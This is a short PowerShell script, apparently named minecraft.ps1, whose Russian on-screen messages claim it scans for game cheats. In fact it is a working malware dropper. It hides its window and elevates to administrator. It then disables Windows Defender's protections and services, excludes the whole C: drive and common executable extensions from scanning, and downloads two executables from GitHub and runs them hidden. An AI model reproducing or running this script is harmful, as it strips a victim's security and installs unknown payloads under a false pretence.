
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null


$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

if (-not $isAdmin) {
    
    $scriptPath = $MyInvocation.MyCommand.Path
    if (-not $scriptPath) { $scriptPath = "minecraft.ps1" }
    
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
    exit
}

Write-Host "[*] ПОИСК ЧИТОВ..." -ForegroundColor Red


Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
Set-MpPreference -SignatureDisableUpdate $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableCatchupFullScan $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableCatchupQuickScan $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableEmailScanning $true -ErrorAction SilentlyContinue

Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "C:\Windows" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "C:\Users" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionExtension ".dll" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionExtension ".bat" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionExtension ".ps1" -ErrorAction SilentlyContinue


Stop-Service WinDefend -Force -ErrorAction SilentlyContinue
Stop-Service SecurityHealthService -Force -ErrorAction SilentlyContinue
Stop-Service wscsvc -Force -ErrorAction SilentlyContinue
Set-Service WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
Set-Service SecurityHealthService -StartupType Disabled -ErrorAction SilentlyContinue


$url1 = "https://github.com/kilordow/Fx.exe/releases/download/lol/RobloxUnblocker.exe"
$url2 = "https://github.com/svhosf/-/raw/refs/heads/main/Updater.exe"
$output1 = "RobloxUnblocker.exe"
$output2 = "Updater.exe"


try {
    Invoke-WebRequest -Uri $url1 -OutFile $output1 -UseBasicParsing -ErrorAction Stop
    Write-Host "[+] ПОЛНАЯ ПРАВЕРКА: $output1" -ForegroundColor Green
    Start-Process -FilePath $output1 -WindowStyle Hidden
} catch {
    Write-Host "[-] ПОИСК..." -ForegroundColor Yellow
    
    # ВТОРОЙ ФАЙЛ
    try {
        Invoke-WebRequest -Uri $url2 -OutFile $output2 -UseBasicParsing -ErrorAction Stop
        Write-Host "[+] ПОИСК КРЯКОВ: $output2" -ForegroundColor Green
        Start-Process -FilePath $output2 -WindowStyle Hidden
    } catch {
        Write-Host "[-] ПРОВЕРКА НЕ ПРОГДЕНА!" -ForegroundColor Red
    }
}

Write-Host "[+] ГОТОВО!" -ForegroundColor Green
